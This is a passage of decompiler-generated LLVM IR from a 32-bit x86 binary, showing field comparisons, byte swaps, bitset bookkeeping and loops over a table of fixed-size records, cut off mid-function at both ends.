  %v2_8050380 = inttoptr i32 %v1_8050380 to i32*
  %v3_8050380 = load i32, i32* %v2_8050380, align 4
  store i32 %v3_8050380, i32* %eax.global-to-local, align 4
  %v1_8050384 = load i32, i32* @global_var_805693c.27, align 4
  %v12_8050384 = icmp eq i32 %v3_8050380, %v1_8050384
  %v1_805038a = icmp eq i1 %v12_8050384, false
  br i1 %v1_805038a, label %dec_label_pc_8050338, label %dec_label_pc_805038c

dec_label_pc_805038c:                             ; preds = %dec_label_pc_8050380
  %v1_805038c = add i32 %v0_8050363, 99
  %v2_805038c = inttoptr i32 %v1_805038c to i8*
  %v3_805038c = load i8, i8* %v2_805038c, align 1
  %v12_805038c = icmp eq i8 %v3_805038c, 6
  %v1_8050391 = icmp eq i1 %v12_805038c, false
  br i1 %v1_8050391, label %dec_label_pc_8050338, label %dec_label_pc_8050393

dec_label_pc_8050393:                             ; preds = %dec_label_pc_805038c
  %v1_8050393 = add i32 %v0_8050363, 110
  %v2_8050393 = inttoptr i32 %v1_8050393 to i32*
  %v3_8050393 = load i32, i32* %v2_8050393, align 4
  store i32 %v3_8050393, i32* %esi.global-to-local, align 4
  %v1_8050397 = trunc i32 %v3_8050393 to i16
  %v7_8050397 = icmp eq i16 %v1_8050397, 5888
  br i1 %v7_8050397, label %dec_label_pc_80503a5, label %dec_label_pc_805039e

dec_label_pc_805039e:                             ; preds = %dec_label_pc_8050393
  %v10_805039e = icmp eq i16 %v1_8050397, 4873
  %v1_80503a3 = icmp eq i1 %v10_805039e, false
  br i1 %v1_80503a3, label %dec_label_pc_8050338, label %dec_label_pc_80503a5

dec_label_pc_80503a5:                             ; preds = %dec_label_pc_805039e, %dec_label_pc_8050393
  %v1_80503a5 = add i32 %v0_8050363, 54
  %v2_80503a5 = inttoptr i32 %v1_80503a5 to i16*
  %v3_80503a5 = load i16, i16* %v2_80503a5, align 2
  %v4_80503a5 = zext i16 %v3_80503a5 to i32
  %v6_80503a5 = and i32 %v3_8050380, -65536
  %v7_80503a5 = or i32 %v4_80503a5, %v6_80503a5
  store i32 %v7_80503a5, i32* %eax.global-to-local, align 4
  %v3_80503aa = add i32 %v0_8050363, 112
  %v4_80503aa = inttoptr i32 %v3_80503aa to i16*
  %v5_80503aa = load i16, i16* %v4_80503aa, align 2
  %v16_80503aa = icmp eq i16 %v3_80503a5, %v5_80503aa
  %v1_80503af = icmp eq i1 %v16_80503aa, false
  br i1 %v1_80503af, label %dec_label_pc_8050338, label %dec_label_pc_80503b1

dec_label_pc_80503b1:                             ; preds = %dec_label_pc_80503a5
  %v1_80503b1 = add i32 %v0_8050363, 123
  %v2_80503b1 = inttoptr i32 %v1_80503b1 to i8*
  %v3_80503b1 = load i8, i8* %v2_80503b1, align 1
  %v4_80503b1 = zext i8 %v3_80503b1 to i32
  %v6_80503b1 = and i32 %v7_80503a5, -256
  %v7_80503b1 = or i32 %v4_80503b1, %v6_80503b1
  store i32 %v7_80503b1, i32* %eax.global-to-local, align 4
  %v2_80503b5 = and i8 %v3_80503b1, 2
  %v3_80503b5 = icmp eq i8 %v2_80503b5, 0
  br i1 %v3_80503b5, label %dec_label_pc_8050338, label %dec_label_pc_80503bd

dec_label_pc_80503bd:                             ; preds = %dec_label_pc_80503b1
  %v2_80503bd = and i32 %v4_80503b1, 16
  %v3_80503bd = icmp eq i32 %v2_80503bd, 0
  br i1 %v3_80503bd, label %dec_label_pc_8050338, label %dec_label_pc_80503c5

dec_label_pc_80503c5:                             ; preds = %dec_label_pc_80503bd
  %v2_80503c5 = and i32 %v4_80503b1, 4
  %v3_80503c5 = icmp eq i32 %v2_80503c5, 0
  %v1_80503c7 = icmp eq i1 %v3_80503c5, false
  br i1 %v1_80503c7, label %dec_label_pc_8050338, label %dec_label_pc_80503cd

dec_label_pc_80503cd:                             ; preds = %dec_label_pc_80503c5
  %tmp302 = urem i8 %v3_80503b1, 2
  %v3_80503cd = icmp eq i8 %tmp302, 0
  %v1_80503cf = icmp eq i1 %v3_80503cd, false
  br i1 %v1_80503cf, label %dec_label_pc_8050338, label %dec_label_pc_80503d5

dec_label_pc_80503d5:                             ; preds = %dec_label_pc_80503cd
  %v1_80503d5 = add i32 %v0_8050363, 118
  %v2_80503d5 = inttoptr i32 %v1_80503d5 to i32*
  %v3_80503d5 = load i32, i32* %v2_80503d5, align 4
  %v1_80503d9 = trunc i32 %v3_80503d5 to i16
  %v2_80503d9 = call i16 @llvm.bswap.i16(i16 %v1_80503d9)
  %v3_80503d9 = zext i16 %v2_80503d9 to i32
  %v1_80503dd = udiv i32 %v3_80503d5, 65536
  %v2_80503dd = mul nuw i32 %v3_80503d9, 65536
  %v1_80503e0 = trunc i32 %v1_80503dd to i16
  %v2_80503e0 = call i16 @llvm.bswap.i16(i16 %v1_80503e0)
  %v3_80503e0 = zext i16 %v2_80503e0 to i32
  %v6_80503e0 = or i32 %v3_80503e0, %v2_80503dd
  store i32 %v6_80503e0, i32* %eax.global-to-local, align 4
  %v1_80503e4 = add i32 %v6_80503e0, -1
  %v1_80503e7 = trunc i32 %v1_80503e4 to i16
  %v2_80503e7 = call i16 @llvm.bswap.i16(i16 %v1_80503e7)
  %v3_80503e7 = zext i16 %v2_80503e7 to i32
  %v1_80503eb = udiv i32 %v1_80503e4, 65536
  %v2_80503eb = mul nuw i32 %v3_80503e7, 65536
  %v1_80503ee = trunc i32 %v1_80503eb to i16
  %v2_80503ee = call i16 @llvm.bswap.i16(i16 %v1_80503ee)
  %v3_80503ee = zext i16 %v2_80503ee to i32
  %v6_80503ee = or i32 %v3_80503ee, %v2_80503eb
  store i32 %v6_80503ee, i32* %edx.global-to-local, align 4
  %v1_80503f2 = add i32 %v0_8050363, 102
  %v2_80503f2 = inttoptr i32 %v1_80503f2 to i32*
  %v3_80503f2 = load i32, i32* %v2_80503f2, align 4
  %v15_80503f2 = icmp eq i32 %v3_80503f2, %v6_80503ee
  %v1_80503f6 = icmp eq i1 %v15_80503f2, false
  br i1 %v1_80503f6, label %dec_label_pc_8050338, label %dec_label_pc_80503fc

dec_label_pc_80503fc:                             ; preds = %dec_label_pc_80503d5
  %v0_80503fc = load i32, i32* @ebx, align 4
  %v1_80503fc = add i32 %v0_80503fc, -127
  %v6_80503fc = sub i32 126, %v0_80503fc
  %v7_80503fc = and i32 %v6_80503fc, %v0_80503fc
  %v8_80503fc = icmp slt i32 %v7_80503fc, 0
  %v9_80503fc = icmp eq i32 %v1_80503fc, 0
  %v10_80503fc = icmp slt i32 %v1_80503fc, 0
  %v3_80503ff = icmp eq i1 %v10_80503fc, %v8_80503fc
  %v4_80503ff = icmp eq i1 %v9_80503fc, false
  %v5_80503ff = and i1 %v4_80503ff, %v3_80503ff
  br i1 %v5_80503ff, label %dec_label_pc_8050445, label %dec_label_pc_8050401

dec_label_pc_8050401:                             ; preds = %dec_label_pc_80503fc
  %v0_8050404 = load i32, i32* @global_var_8056958.45, align 8
  store i32 %v0_8050404, i32* %ecx.global-to-local, align 4
  %v2_805040a = mul i32 %v0_80503fc, 288
  %v2_805040d = add i32 %v0_8050404, %v2_805040a
  store i32 %v2_805040d, i32* @eax, align 4
  %v1_805040f = add i32 %v2_805040d, 12
  %v2_805040f = inttoptr i32 %v1_805040f to i32*
  %v3_805040f = load i32, i32* %v2_805040f, align 4
  %v1_8050412 = add i32 %v2_805040d, 288
  store i32 %v1_8050412, i32* %ecx.global-to-local, align 4
  %v1_8050418 = icmp eq i32 %v3_805040f, 0
  br i1 %v1_8050418, label %dec_label_pc_8050434, label %dec_label_pc_805041c

dec_label_pc_805041c:                             ; preds = %dec_label_pc_8050401, %dec_label_pc_8050425
  %v0_8050425 = phi i32 [ %v1_8050427, %dec_label_pc_8050425 ], [ %v1_8050412, %dec_label_pc_8050401 ]
  %v0_805041c = phi i32 [ %v1_805041c, %dec_label_pc_8050425 ], [ %v0_80503fc, %dec_label_pc_8050401 ]
  %v1_805041c = add i32 %v0_805041c, 1
  store i32 %v1_805041c, i32* @ebx, align 4
  %v6_805041d = icmp eq i32 %v0_805041c, 127
  br i1 %v6_805041d, label %dec_label_pc_8050445.loopexit, label %dec_label_pc_8050425

dec_label_pc_8050425:                             ; preds = %dec_label_pc_805041c
  store i32 %v0_8050425, i32* @eax, align 4
  %v1_8050427 = add i32 %v0_8050425, 288
  store i32 %v1_8050427, i32* %ecx.global-to-local, align 4
  %v1_805042d = add i32 %v0_8050425, 12
  %v2_805042d = inttoptr i32 %v1_805042d to i32*
  %v3_805042d = load i32, i32* %v2_805042d, align 4
  store i32 %v3_805042d, i32* @edi, align 4
  %v1_8050430 = icmp eq i32 %v3_805042d, 0
  %v1_8050432 = icmp eq i1 %v1_8050430, false
  br i1 %v1_8050432, label %dec_label_pc_805041c, label %dec_label_pc_8050434.loopexit

dec_label_pc_8050434.loopexit:                    ; preds = %dec_label_pc_8050425
  br label %dec_label_pc_8050434

dec_label_pc_8050434:                             ; preds = %dec_label_pc_8050434.loopexit, %dec_label_pc_8050401
  %v1_8050434 = phi i32 [ %v0_8050425, %dec_label_pc_8050434.loopexit ], [ %v2_805040d, %dec_label_pc_8050401 ]
  %v2_8050434 = add i32 %v1_8050434, 16
  %v3_8050434 = inttoptr i32 %v2_8050434 to i32*
  store i32 %v6_80503ee, i32* %v3_8050434, align 4
  %v0_8050437 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050437 = trunc i32 %v0_8050437 to i16
  %v2_8050437 = load i32, i32* @eax, align 4
  %v3_8050437 = add i32 %v2_8050437, 20
  %v4_8050437 = inttoptr i32 %v3_8050437 to i16*
  store i16 %v1_8050437, i16* %v4_8050437, align 2
  %v0_805043b = call i32 @function_804f800()
  store i32 %v0_805043b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050338

dec_label_pc_8050445.loopexit:                    ; preds = %dec_label_pc_805041c
  br label %dec_label_pc_8050445

dec_label_pc_8050445:                             ; preds = %dec_label_pc_80503fc, %dec_label_pc_805036e, %dec_label_pc_8050338, %dec_label_pc_8050445.loopexit
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_805044e = add i32 %v0_8050363, 44
  %v2_805044e = inttoptr i32 %v1_805044e to i32*
  %v3_805044e = load i32, i32* %v2_805044e, align 4
  %v4_805044e = inttoptr i32 %v3_805044e to i8*
  %v5_8050453 = call i8* @_memset(i8* %v4_805044e, i32 0, i32 32)
  %v0_8050455 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8050455, i32* %ecx.global-to-local, align 4
  %v0_8050457 = load i32, i32* @esp, align 4
  %v1_8050457 = add i32 %v0_8050457, 8
  %v2_8050457 = inttoptr i32 %v1_8050457 to i32*
  %v3_8050457 = load i32, i32* %v2_8050457, align 4
  %v4_8050457 = inttoptr i32 %v3_8050457 to i8*
  store i1 false, i1* @df, align 1
  %v2_805045c = load i32, i32* %eax.global-to-local, align 4
  %v5_805045c = call i8* @_memset(i8* %v4_8050457, i32 %v2_805045c, i32 %v0_8050455)
  %v6_805045c = ptrtoint i8* %v5_805045c to i32
  store i32 %v6_805045c, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  %v0_8050460 = load i32, i32* @esp, align 4
  %v1_8050460 = add i32 %v0_8050460, 1868
  %v2_8050460 = inttoptr i32 %v1_8050460 to i32*
  store i32 0, i32* %v2_8050460, align 4
  store i32 0, i32* @esi, align 4
  %v0_805046d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805046d

dec_label_pc_805046d:                             ; preds = %dec_label_pc_80504c0, %dec_label_pc_8050445
  %v0_805046d = phi i32 [ %v0_80504cf, %dec_label_pc_80504c0 ], [ %v0_805046d.pre, %dec_label_pc_8050445 ]
  %v0_8050470 = load i32, i32* @global_var_8056958.45, align 8
  store i32 %v0_8050470, i32* %eax.global-to-local, align 4
  %v2_8050475 = mul i32 %v0_805046d, 288
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_805047d = add i32 %v0_8050470, %v2_8050475
  store i32 %v2_805047d, i32* @ebx, align 4
  %v1_805047f = add i32 %v2_805047d, 12
  %v2_805047f = inttoptr i32 %v1_805047f to i32*
  %v3_805047f = load i32, i32* %v2_805047f, align 4
  store i32 %v3_805047f, i32* %edx.global-to-local, align 4
  %v1_8050482 = add i32 %v3_805047f, -1
  %v5_8050482 = icmp eq i32 %v3_805047f, 0
  %v9_8050482 = icmp eq i32 %v1_8050482, 0
  %v2_8050485 = or i1 %v5_8050482, %v9_8050482
  br i1 %v2_8050485, label %dec_label_pc_8051022, label %dec_label_pc_805048b

dec_label_pc_805048b:                             ; preds = %dec_label_pc_805046d, %dec_label_pc_805102a
  %v1_8050495 = phi i32 [ 30, %dec_label_pc_805046d ], [ 5, %dec_label_pc_805102a ]
  %v0_805048b = load i32, i32* @global_var_8056910.34, align 16
  store i32 %v0_805048b, i32* %eax.global-to-local, align 4
  %v1_8050490 = add i32 %v2_805047d, 8
  %v2_8050490 = inttoptr i32 %v1_8050490 to i32*
  %v3_8050490 = load i32, i32* %v2_8050490, align 4
  %v2_8050493 = sub i32 %v0_805048b, %v3_8050490
  store i32 %v2_8050493, i32* %eax.global-to-local, align 4
  %tmp296 = icmp ugt i32 %v2_8050493, %v1_8050495
  br i1 %tmp296, label %dec_label_pc_8050fc0, label %dec_label_pc_805049d

dec_label_pc_805049d:                             ; preds = %dec_label_pc_805048b
  store i32 %v1_8050482, i32* %edx.global-to-local, align 4
  %v1_8050f95 = add i32 %v2_805047d, 4
  %v2_8050f95 = inttoptr i32 %v1_8050f95 to i32*
  %v3_8050f95 = load i32, i32* %v2_8050f95, align 4
  %v1_8050f9a = urem i32 %v3_8050f95, 32
  store i32 %v1_8050f9a, i32* %eax.global-to-local, align 4
  %v2_8050f9d = udiv i32 %v3_8050f95, 32
  store i32 %v2_8050f9d, i32* %edx.global-to-local, align 4
  %v0_8050fa0 = load i32, i32* @esp, align 4
  %v2_8050fa0 = mul nuw nsw i32 %v2_8050f9d, 4
  br i1 %v9_8050482, label %dec_label_pc_8050f95, label %dec_label_pc_80504a4

dec_label_pc_80504a4:                             ; preds = %dec_label_pc_805049d
  %v3_80504af = add nuw nsw i32 %v2_8050fa0, 1700
  %v4_80504af = add i32 %v3_80504af, %v0_8050fa0
  %v5_80504af = inttoptr i32 %v4_80504af to i32*
  %v6_80504af = load i32, i32* %v5_80504af, align 4
  %v9_80504af = shl i32 1, %v1_8050f9a
  %v12_80504af = or i32 %v6_80504af, %v9_80504af
  store i32 %v12_80504af, i32* %v5_80504af, align 4
  %v0_80504b7 = load i32, i32* @ebx, align 4
  %v1_80504b7 = add i32 %v0_80504b7, 4
  %v2_80504b7 = inttoptr i32 %v1_80504b7 to i32*
  %v3_80504b7 = load i32, i32* %v2_80504b7, align 4
  store i32 %v3_80504b7, i32* %eax.global-to-local, align 4
  %v0_80504ba = load i32, i32* @edi, align 4
  %v2_80504ba = sub i32 %v0_80504ba, %v3_80504b7
  %v8_80504ba = xor i32 %v0_80504ba, %v3_80504b7
  %v9_80504ba = xor i32 %v2_80504ba, %v0_80504ba
  %v10_80504ba = and i32 %v9_80504ba, %v8_80504ba
  %v11_80504ba = icmp slt i32 %v10_80504ba, 0
  %v13_80504ba = icmp slt i32 %v2_80504ba, 0
  %v2_80504bc = icmp eq i1 %v13_80504ba, %v11_80504ba
  br i1 %v2_80504bc, label %dec_label_pc_80504c0, label %dec_label_pc_80504be

dec_label_pc_80504be:                             ; preds = %dec_label_pc_80504a4
  store i32 %v3_80504b7, i32* @edi, align 4
  br label %dec_label_pc_80504c0

dec_label_pc_80504c0:                             ; preds = %dec_label_pc_8051022, %dec_label_pc_8050f95, %dec_label_pc_80504a4, %dec_label_pc_805100f, %dec_label_pc_8050fed, %dec_label_pc_8050fb3, %dec_label_pc_80504be
  %v0_80504c0 = load i32, i32* @esp, align 4
  %v1_80504c0 = add i32 %v0_80504c0, 1868
  %v2_80504c0 = inttoptr i32 %v1_80504c0 to i32*
  %v3_80504c0 = load i32, i32* %v2_80504c0, align 4
  %v1_80504c7 = add i32 %v3_80504c0, 1
  store i32 %v1_80504c7, i32* %eax.global-to-local, align 4
  store i32 %v1_80504c7, i32* %v2_80504c0, align 4
  %v0_80504cf = load i32, i32* %eax.global-to-local, align 4
  %v1_80504cf = add i32 %v0_80504cf, -127
  %v6_80504cf = sub i32 126, %v0_80504cf
  %v7_80504cf = and i32 %v6_80504cf, %v0_80504cf
  %v8_80504cf = icmp slt i32 %v7_80504cf, 0
  %v9_80504cf = icmp eq i32 %v1_80504cf, 0
  %v10_80504cf = icmp slt i32 %v1_80504cf, 0
  %v3_80504d2 = icmp ne i1 %v10_80504cf, %v8_80504cf
  %v4_80504d2 = or i1 %v9_80504cf, %v3_80504d2
  br i1 %v4_80504d2, label %dec_label_pc_805046d, label %dec_label_pc_80504d4

dec_label_pc_80504d4:                             ; preds = %dec_label_pc_80504c0
  %v0_80504d4 = load i32, i32* @esp, align 4
  %v1_80504d4 = add i32 %v0_80504d4, 1860
  %v2_80504d4 = inttoptr i32 %v1_80504d4 to i32*
  store i32 0, i32* %v2_80504d4, align 4
  %v0_80504df = load i32, i32* @esp, align 4
  %v1_80504df = add i32 %v0_80504df, 1856
  %v2_80504df = inttoptr i32 %v1_80504df to i32*
  store i32 1, i32* %v2_80504df, align 4
  %v0_80504ea = load i32, i32* @esp, align 4
  %v0_80504ed = load i32, i32* @edi, align 4
  %v1_80504ed = load i32, i32* @esi, align 4
  %v2_80504ed = sub i32 %v0_80504ed, %v1_80504ed
  %v8_80504ed = xor i32 %v1_80504ed, %v0_80504ed
  %v9_80504ed = xor i32 %v2_80504ed, %v0_80504ed
  %v10_80504ed = and i32 %v9_80504ed, %v8_80504ed
  %v11_80504ed = icmp slt i32 %v10_80504ed, 0
  %v13_80504ed = icmp slt i32 %v2_80504ed, 0
  %v1_80504ef = add i32 %v0_80504ea, 1856
  %v2_80504f6 = add i32 %v0_80504ea, -16
  %v3_80504f6 = inttoptr i32 %v2_80504f6 to i32*
  store i32 %v1_80504ef, i32* %v3_80504f6, align 4
  %v1_80504f7 = add i32 %v0_80504ea, -20
  %v2_80504f7 = inttoptr i32 %v1_80504f7 to i32*
  store i32 0, i32* %v2_80504f7, align 4
  %v1_80504f9 = add i32 %v0_80504ea, 1572
  store i32 %v1_80504f9, i32* %edx.global-to-local, align 4
  %v0_8050500 = load i32, i32* @edi, align 4
  store i32 %v0_8050500, i32* %eax.global-to-local, align 4
  %v2_8050502 = add i32 %v0_80504ea, -24
  %v3_8050502 = inttoptr i32 %v2_8050502 to i32*
  store i32 %v1_80504f9, i32* %v3_8050502, align 4
  %v1_8050503 = add i32 %v0_80504ea, 1700
  store i32 %v1_8050503, i32* %ecx.global-to-local, align 4
  %v2_805050a = add i32 %v0_80504ea, -28
  %v3_805050a = inttoptr i32 %v2_805050a to i32*
  store i32 %v1_8050503, i32* %v3_805050a, align 4
  %v2_805050b = icmp eq i1 %v13_80504ed, %v11_80504ed
  br i1 %v2_805050b, label %dec_label_pc_80504d4.dec_label_pc_805050f_crit_edge, label %dec_label_pc_805050d

dec_label_pc_80504d4.dec_label_pc_805050f_crit_edge: ; preds = %dec_label_pc_80504d4
  %v0_805050f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805050f

dec_label_pc_805050d:                             ; preds = %dec_label_pc_80504d4
  %v0_805050d = load i32, i32* @esi, align 4
  store i32 %v0_805050d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805050f

dec_label_pc_805050f:                             ; preds = %dec_label_pc_80504d4.dec_label_pc_805050f_crit_edge, %dec_label_pc_805050d
  %v0_805050f = phi i32 [ %v0_805050f.pre, %dec_label_pc_80504d4.dec_label_pc_805050f_crit_edge ], [ %v0_805050d, %dec_label_pc_805050d ]
  %v1_805050f = add i32 %v0_805050f, 1
  store i32 %v1_805050f, i32* %eax.global-to-local, align 4
  %v2_8050510 = add i32 %v0_80504ea, -32
  %v3_8050510 = inttoptr i32 %v2_8050510 to i32*
  store i32 %v1_805050f, i32* %v3_8050510, align 4
  %v0_8050511 = call i32 @function_80523e8()
  store i32 %v0_8050511, i32* %eax.global-to-local, align 4
  %v0_8050516 = load i32, i32* @esp, align 4
  %v1_8050519 = add i32 %v0_8050516, 16
  %v2_8050519 = inttoptr i32 %v1_8050519 to i32*
  store i32 0, i32* %v2_8050519, align 4
  %v2_805051b = call i32 @function_80524a2(i32* nonnull @0)
  %v0_8050520 = load i32, i32* @esp, align 4
  %v1_8050520 = add i32 %v0_8050520, 1884
  %v2_8050520 = inttoptr i32 %v1_8050520 to i32*
  store i32 0, i32* %v2_8050520, align 4
  store i32 %v2_805051b, i32* @global_var_8056910.34, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050535

dec_label_pc_8050535:                             ; preds = %dec_label_pc_805057e, %dec_label_pc_805050f
  %v0_8050535 = phi i32 [ %v0_805058d, %dec_label_pc_805057e ], [ 0, %dec_label_pc_805050f ]
  %v0_8050538 = load i32, i32* @global_var_8056958.45, align 8
  store i32 %v0_8050538, i32* %eax.global-to-local, align 4
  %v2_805053d = mul i32 %v0_8050535, 288
  %v2_8050540 = add i32 %v0_8050538, %v2_805053d
  store i32 %v2_8050540, i32* @edi, align 4
  %v1_8050542 = add i32 %v2_8050540, 4
  %v2_8050542 = inttoptr i32 %v1_8050542 to i32*
  %v3_8050542 = load i32, i32* %v2_8050542, align 4
  store i32 %v3_8050542, i32* %ecx.global-to-local, align 4
  %v10_8050545 = icmp eq i32 %v3_8050542, -1
  br i1 %v10_8050545, label %dec_label_pc_805057e, label %dec_label_pc_805054a

dec_label_pc_805054a:                             ; preds = %dec_label_pc_8050535
  %v2_805054e = udiv i32 %v3_8050542, 32
  store i32 %v2_805054e, i32* %edx.global-to-local, align 4
  %v1_8050551 = urem i32 %v3_8050542, 32
  store i32 %v1_8050551, i32* %eax.global-to-local, align 4
  %v0_8050554 = load i32, i32* @esp, align 4
  %v2_8050554 = mul nuw nsw i32 %v2_805054e, 4
  %v3_8050554 = add nuw nsw i32 %v2_8050554, 1572
  %v4_8050554 = add i32 %v3_8050554, %v0_8050554
  %v5_8050554 = inttoptr i32 %v4_8050554 to i32*
  %v6_8050554 = load i32, i32* %v5_8050554, align 4
  %v9_8050554 = shl i32 1, %v1_8050551
  %v10_8050554 = and i32 %v6_8050554, %v9_8050554
  %v11_8050554 = icmp ne i32 %v10_8050554, 0
  %v1_805055c = zext i1 %v11_8050554 to i32
  store i32 %v1_805055c, i32* %eax.global-to-local, align 4
  %v4_805055f = icmp eq i1 %v11_8050554, false
  %v1_8050561 = icmp eq i1 %v4_805055f, false
  br i1 %v1_8050561, label %dec_label_pc_8050ecb, label %dec_label_pc_8050567

dec_label_pc_8050567:                             ; preds = %dec_label_pc_805054a, %dec_label_pc_8050f5b
  %v0_805056f = phi i32 [ %v0_8050554, %dec_label_pc_805054a ], [ %v0_805056f.pre, %dec_label_pc_8050f5b ]
  %v0_8050567 = phi i32 [ %v3_8050542, %dec_label_pc_805054a ], [ %v0_8050567.pre, %dec_label_pc_8050f5b ]
  %v2_8050569 = udiv i32 %v0_8050567, 32
  store i32 %v2_8050569, i32* %ecx.global-to-local, align 4
  %v1_805056c = urem i32 %v0_8050567, 32
  store i32 %v1_805056c, i32* %eax.global-to-local, align 4
  %v2_805056f = mul nuw nsw i32 %v2_8050569, 4
  %v3_805056f = add i32 %v0_805056f, 1700
  %v4_805056f = add i32 %v3_805056f, %v2_805056f
  %v5_805056f = inttoptr i32 %v4_805056f to i32*
  %v6_805056f = load i32, i32* %v5_805056f, align 4
  %v9_805056f = shl i32 1, %v1_805056c
  %v10_805056f = and i32 %v6_805056f, %v9_805056f
  %v11_805056f = icmp ne i32 %v10_805056f, 0
  %v1_8050577 = zext i1 %v11_805056f to i32
  store i32 %v1_8050577, i32* %eax.global-to-local, align 4
  %v4_805057a = icmp eq i1 %v11_805056f, false
  %v1_805057c = icmp eq i1 %v4_805057a, false
  br i1 %v1_805057c, label %dec_label_pc_80505d3.preheader, label %dec_label_pc_805057e

dec_label_pc_80505d3.preheader:                   ; preds = %dec_label_pc_8050567
  %v0_80505d327 = load i32, i32* @edi, align 4
  %v1_80505d328 = add i32 %v0_80505d327, 12
  %v2_80505d329 = inttoptr i32 %v1_80505d328 to i32*
  %v3_80505d330 = load i32, i32* %v2_80505d329, align 4
  store i32 %v3_80505d330, i32* %eax.global-to-local, align 4
  %v1_80505d631 = icmp eq i32 %v3_80505d330, 0
  br i1 %v1_80505d631, label %dec_label_pc_805057e, label %dec_label_pc_80505da

dec_label_pc_805057e:                             ; preds = %dec_label_pc_80505d3.backedge, %dec_label_pc_80505d3.preheader, %dec_label_pc_8050b3b, %dec_label_pc_8050567, %dec_label_pc_8050535, %dec_label_pc_8051047, %dec_label_pc_8050f6c, %dec_label_pc_8050b73
  %v0_805057e = load i32, i32* @esp, align 4
  %v1_805057e = add i32 %v0_805057e, 1868
  %v2_805057e = inttoptr i32 %v1_805057e to i32*
  %v3_805057e = load i32, i32* %v2_805057e, align 4
  %v1_8050585 = add i32 %v3_805057e, 1
  store i32 %v1_8050585, i32* %eax.global-to-local, align 4
  store i32 %v1_8050585, i32* %v2_805057e, align 4
  %v0_805058d = load i32, i32* %eax.global-to-local, align 4
  %v1_805058d = add i32 %v0_805058d, -127
  %v6_805058d = sub i32 126, %v0_805058d
  %v7_805058d = and i32 %v6_805058d, %v0_805058d
  %v8_805058d = icmp slt i32 %v7_805058d, 0
  %v9_805058d = icmp eq i32 %v1_805058d, 0
  %v10_805058d = icmp slt i32 %v1_805058d, 0
  %v3_8050590 = icmp ne i1 %v10_805058d, %v8_805058d
  %v4_8050590 = or i1 %v9_805058d, %v3_8050590
  br i1 %v4_8050590, label %dec_label_pc_8050535, label %dec_label_pc_8050592

dec_label_pc_8050597:                             ; preds = %dec_label_pc_8050645
  %v1_8050597 = add i32 %v0_8050645, 24
  %v2_8050597 = inttoptr i32 %v1_8050597 to i32*
  %v3_8050597 = load i32, i32* %v2_8050597, align 4
  %v1_805059a = add i32 %v3_8050597, -1
  store i32 %v1_805059a, i32* %eax.global-to-local, align 4
  %tmp136 = icmp slt i32 %v1_805059a, 1
  br i1 %tmp136, label %dec_label_pc_80505d3.loopexit12.loopexit, label %dec_label_pc_805059f.preheader

dec_label_pc_805059f.preheader:                   ; preds = %dec_label_pc_8050597
  %v7_805059f.pre = load i32, i32* @edx, align 4
  %v2_805059f = add i32 %v0_8050645, 28
  br label %dec_label_pc_805059f

dec_label_pc_805059f:                             ; preds = %dec_label_pc_805059f.preheader, %dec_label_pc_80505d0
  %v7_805059f = phi i32 [ %v7_805059f.pre, %dec_label_pc_805059f.preheader ], [ %v9_805059f, %dec_label_pc_80505d0 ]
  %v0_8050dc8 = phi i32 [ %v1_805059a, %dec_label_pc_805059f.preheader ], [ %v1_80505d0, %dec_label_pc_80505d0 ]
  %v3_805059f = add i32 %v2_805059f, %v0_8050dc8
  %v4_805059f = inttoptr i32 %v3_805059f to i8*
  %v5_805059f = load i8, i8* %v4_805059f, align 1
  %v6_805059f = zext i8 %v5_805059f to i32
  %v8_805059f = and i32 %v7_805059f, -256
  %v9_805059f = or i32 %v6_805059f, %v8_805059f
  store i32 %v9_805059f, i32* %edx.global-to-local, align 4
  %v10_80505a3 = icmp eq i8 %v5_805059f, 58
  br i1 %v10_80505a3, label %dec_label_pc_8050dc8, label %dec_label_pc_80505ac

dec_label_pc_80505ac:                             ; preds = %dec_label_pc_805059f
  %v10_80505ac = icmp eq i8 %v5_805059f, 62
  br i1 %v10_80505ac, label %dec_label_pc_8050dc8, label %dec_label_pc_80505b5

dec_label_pc_80505b5:                             ; preds = %dec_label_pc_80505ac
  %v10_80505b5 = icmp eq i8 %v5_805059f, 36
  br i1 %v10_80505b5, label %dec_label_pc_8050dc8, label %dec_label_pc_80505be

dec_label_pc_80505be:                             ; preds = %dec_label_pc_80505b5
  %v10_80505be = icmp eq i8 %v5_805059f, 35
  br i1 %v10_80505be, label %dec_label_pc_8050dc8, label %dec_label_pc_80505c7

dec_label_pc_80505c7:                             ; preds = %dec_label_pc_80505be
  %v10_80505c7 = icmp eq i8 %v5_805059f, 37
  br i1 %v10_80505c7, label %dec_label_pc_8050dc8, label %dec_label_pc_80505d0

dec_label_pc_80505d0:                             ; preds = %dec_label_pc_80505c7
  %v1_80505d0 = add i32 %v0_8050dc8, -1
  %v8_80505d0 = icmp eq i32 %v1_80505d0, 0
  store i32 %v1_80505d0, i32* %eax.global-to-local, align 4
  %v1_80505d1 = icmp eq i1 %v8_80505d0, false
  br i1 %v1_80505d1, label %dec_label_pc_805059f, label %dec_label_pc_80505d3.backedge

dec_label_pc_80505d3.backedge:                    ; preds = %dec_label_pc_8050a73.thread, %dec_label_pc_80505d3.loopexit12.loopexit, %dec_label_pc_8050a60, %dec_label_pc_805080d, %dec_label_pc_8050995, %dec_label_pc_8050852, %dec_label_pc_80505d0
  %v0_80505d3 = phi i32 [ %v0_8050645, %dec_label_pc_80505d0 ], [ %v0_8050645, %dec_label_pc_8050852 ], [ %v0_8050645, %dec_label_pc_8050995 ], [ %v0_8050645, %dec_label_pc_805080d ], [ %v0_8050645, %dec_label_pc_8050a60 ], [ %v0_80505d3.pre.pre, %dec_label_pc_80505d3.loopexit12.loopexit ], [ %v0_8050645, %dec_label_pc_8050a73.thread ]
  %v1_80505d3 = add i32 %v0_80505d3, 12
  %v2_80505d3 = inttoptr i32 %v1_80505d3 to i32*
  %v3_80505d3 = load i32, i32* %v2_80505d3, align 4
  store i32 %v3_80505d3, i32* %eax.global-to-local, align 4
